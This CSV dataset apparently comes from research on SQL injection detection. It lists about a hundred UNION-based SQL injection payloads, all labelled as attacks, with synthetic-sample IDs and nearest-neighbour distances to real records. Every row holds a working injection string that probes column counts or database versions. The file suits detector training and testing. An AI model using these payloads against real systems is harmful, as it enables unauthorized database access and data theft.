id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000397,attack,union,"-8794   )    )     )   union all select 5802,5802,5802--",nearest_attack_euclidean,R001127,5.229662741548202
CTGAN_000398,attack,union,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",nearest_attack_euclidean,R001471,4.154655223239828
CTGAN_000399,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R001437,5.923830732571244
CTGAN_000400,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R001244,4.59921405226959
CTGAN_000401,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000371,4.346555559005028
CTGAN_000402,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000850,8.815438497421482
CTGAN_000403,attack,union,"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",nearest_attack_euclidean,R000273,5.1318717761715185
CTGAN_000404,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R001158,4.6680966280469685
CTGAN_000405,attack,union,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",nearest_attack_euclidean,R000660,5.045739272353523
CTGAN_000406,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,6.003493933088352
CTGAN_000407,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000269,6.412225711170394
CTGAN_000408,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000913,6.195810000755838
CTGAN_000409,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R001194,5.531533644328159
CTGAN_000410,attack,union,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",nearest_attack_euclidean,R000808,5.919247963454187
CTGAN_000411,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,5.948348096103961
CTGAN_000412,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000432,4.179032988388142
CTGAN_000413,attack,union,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",nearest_attack_euclidean,R000391,6.218608526175695
CTGAN_000414,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000712,3.3768111767868545
CTGAN_000415,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000211,6.741030789320555
CTGAN_000416,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000504,6.0563174284183745
CTGAN_000417,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,6.602504011234333
CTGAN_000418,attack,union,"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",nearest_attack_euclidean,R000946,5.461455689096844
CTGAN_000419,attack,union,"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",nearest_attack_euclidean,R000357,6.217861397293252
CTGAN_000420,attack,union,"-1573""  )   union all select 3928,3928,3928,3928--",nearest_attack_euclidean,R000647,3.621573223455117
CTGAN_000421,attack,union,"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",nearest_attack_euclidean,R001274,6.3623966278012825
CTGAN_000422,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001337,7.294361724013055
CTGAN_000423,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R001474,6.957589303049824
CTGAN_000424,attack,union,"-8021""  )   union all select 1166,1166,1166,1166--",nearest_attack_euclidean,R001532,5.303724398763219
CTGAN_000425,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,7.363645453149541
CTGAN_000426,attack,union,"-8369""   )    )    union all select 2191--",nearest_attack_euclidean,R000359,4.268312901274272
CTGAN_000427,attack,union,"1' in boolean mode  )   union all select null,null--",nearest_attack_euclidean,R000376,5.119015789326679
CTGAN_000428,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000337,6.430533682528921
CTGAN_000429,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000380,5.009725461545036
CTGAN_000430,attack,union,"1 union all select null,null,null,null,null--",nearest_attack_euclidean,R000541,5.810370820247239
CTGAN_000431,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000973,6.167818392811421
CTGAN_000432,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000932,6.857609916483947
CTGAN_000433,attack,union,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",nearest_attack_euclidean,R000971,9.115944652441758
CTGAN_000434,attack,union,"-8021""  )   union all select 1166,1166,1166,1166--",nearest_attack_euclidean,R001532,5.605377008816814
CTGAN_000435,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R001099,5.171784081915422
CTGAN_000436,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000260,5.551835952057424
CTGAN_000437,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000442,5.703381518048832
CTGAN_000438,attack,union,"1%'   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R001302,5.394257026633019
CTGAN_000439,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,5.239464841324553
CTGAN_000440,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000337,5.135185818998906
CTGAN_000441,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000976,6.564493723037294
CTGAN_000442,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,6.973208141228227
CTGAN_000443,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000243,4.681418378728708
CTGAN_000444,attack,union,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",nearest_attack_euclidean,R000897,3.098032743001101
CTGAN_000445,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000172,6.808738001062143
CTGAN_000446,attack,union,"-7008'   )    )    union all select 9080,9080,9080#",nearest_attack_euclidean,R001145,5.982438926894487
CTGAN_000447,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000961,5.13740962729778
CTGAN_000448,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.379938153398695
CTGAN_000449,attack,union,"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",nearest_attack_euclidean,R000586,4.30233904326817
CTGAN_000450,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000508,5.336590361620158
CTGAN_000451,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,5.031225874263168
CTGAN_000452,attack,union,"1 where 1992  =  1992 union all select null,null--",nearest_attack_euclidean,R000418,6.904820370902117
CTGAN_000453,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,6.868751097232198
CTGAN_000454,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,7.421279192050452
CTGAN_000455,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001552,4.789842720862378
CTGAN_000456,attack,union,"1  )   where 8630  =  8630 union all select null,null--",nearest_attack_euclidean,R000548,4.644960065966781
CTGAN_000457,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000913,4.135398996418008
CTGAN_000458,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000046,7.69907629682394
CTGAN_000459,attack,union,"-9337  )   union all select 5648,5648,5648,5648,5648#",nearest_attack_euclidean,R000461,5.800833777778501
CTGAN_000460,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,5.870849217950886
CTGAN_000461,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R001194,5.490232154612792
CTGAN_000462,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000850,5.02665329652208
CTGAN_000463,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000829,6.705340464110561
CTGAN_000464,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R001100,5.942082514202755
CTGAN_000465,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R001004,4.810064114619354
CTGAN_000466,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,5.677676387292739
CTGAN_000467,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001047,5.194264829428596
CTGAN_000468,attack,union,"-3834'   )    )     )   union all select 8313,8313--",nearest_attack_euclidean,R000639,5.558635573474539
CTGAN_000469,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001382,5.2383813218057735
CTGAN_000470,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,7.683594718930723
CTGAN_000471,attack,union,"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001430,4.633979593634655
CTGAN_000472,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000295,5.366880737237631
CTGAN_000473,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000277,7.704431786226295
CTGAN_000474,attack,union,"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",nearest_attack_euclidean,R001101,5.5419266858267
CTGAN_000475,attack,union,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",nearest_attack_euclidean,R001084,5.440964793987369
CTGAN_000476,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R001142,5.292712559337045
CTGAN_000477,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000258,5.567023691450016
CTGAN_000478,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000264,6.539774343521413
CTGAN_000479,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000043,7.535147366091781
CTGAN_000480,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000887,4.291198966118545
CTGAN_000481,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000354,5.787734925018339
CTGAN_000482,attack,union,"-8005""  )   union all select 5213,5213,5213,5213,5213--",nearest_attack_euclidean,R001352,4.3431146964578975
CTGAN_000483,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000172,5.963365413445721
CTGAN_000484,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,7.057569287689988
CTGAN_000485,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001044,4.238598318978331
CTGAN_000486,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000662,7.049076662374215
CTGAN_000487,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000330,6.162409439161631
CTGAN_000488,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001431,5.163207626779537
CTGAN_000489,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000916,6.590035201743869
CTGAN_000490,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,6.902179077380984
CTGAN_000491,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R001244,5.690780402193553
CTGAN_000492,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000890,5.20786956103535
CTGAN_000493,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000847,5.412358262235599
CTGAN_000494,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000473,6.247086160745148
CTGAN_000495,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,5.549446985667527
CTGAN_000496,attack,union,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",nearest_attack_euclidean,R000417,5.006895231824952
CTGAN_000497,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R001117,5.3366675073733925
CTGAN_000498,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,5.165681794389283
CTGAN_000499,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R001080,4.995429620462049
CTGAN_000500,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001172,6.021490968666022
